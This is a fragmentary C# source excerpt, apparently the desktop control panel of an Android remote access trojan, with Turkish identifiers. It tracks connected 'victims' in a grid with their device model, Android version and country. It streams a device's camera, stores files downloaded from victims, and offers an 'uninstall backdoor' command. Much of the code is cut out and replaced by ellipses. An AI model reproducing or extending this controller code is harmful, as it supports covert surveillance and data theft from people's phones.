    ...
    */
    public partial class Form1 : Form
    {
        ...
        public Form1()
        {
            ...
            {
                dataGridView1.Columns[b].HeaderCell.Style.BackColor = Color.DimGray;
                dataGridView1.Columns[b].HeaderCell.Style.ForeColor = Color.White;
            }
        }
                ...
                switch (tag.Split('|')[0])
                {
                                    ...
                                    if (shortcam != null)
                                    {
                                        if (shortcam.button4.Text == "Stop")
                                        {
                                            ...
                                            using (Image im = (Image)new ImageConverter().ConvertFrom(dataBuff))
                                            {
                                                ...
                                                shortcam.label6.Text = GetFileSizeInBytes(dataBuff.Length);
                                            }
                                        }
                                        else
                                        {
                    ...
                    case "<CAMNOT>":
                        ...
                        if (fnd != null)
                        {
                            ...
                            if (mess != "ECHO" && mess != "vid")
                            {
                                MessageBox.Show(fnd, mess, "Warning - Camera Preview Error", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                            }
                        }
                        break;
                    ...
                    case "<UZUNLUK>":
                        ...
                        try
                        {
                            ...
                            if (victim != null)
                            {
                                string path = Environment.CurrentDirectory + "\\Klasörler\\İndirilenler\\" + id;
            ...
            string ulke_dil, string uretici_model, string android_ver, string wallpaper, string idenfication)
        {
            ...
            if (File.Exists(Environment.CurrentDirectory + "\\Klasörler\\Bayraklar\\" + ulke_dil.Split('/')[1].Replace("en", "england") + ".png"))
            {
                ...
                Image.FromFile(Environment.CurrentDirectory + "\\Klasörler\\Bayraklar\\" + ulke_dil.Split('/')[1].Replace("en", "england") + ".png"), (Image)row.Cells["Column1"].Value).Show();
            }
            else
            {
                new Bildiri(makine_ismi, uretici_model, android_ver, Image.FromFile(Environment.CurrentDirectory + "\\Klasörler\\Bayraklar\\-1.png"), (Image)row.Cells["Column1"].Value).Show();
            }
            toolStripStatusLabel2.Text = "Online: " + dataGridView1.Rows.Count.ToString();
            ...
            foreach (Kurbanlar krbn in kurban_listesi.ToList())
            {
                ...
                catch (Exception ex)
                {
                    ...
                    try
                    {
                        ...
                        toolStripStatusLabel2.Text = "Online: " + dataGridView1.SelectedRows.Count.ToString();
                    }
                    catch (Exception) { }
                }
            }
        ...
        private void uninstallBackdoorToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (dataGridView1.SelectedRows.Count == 1)
            {
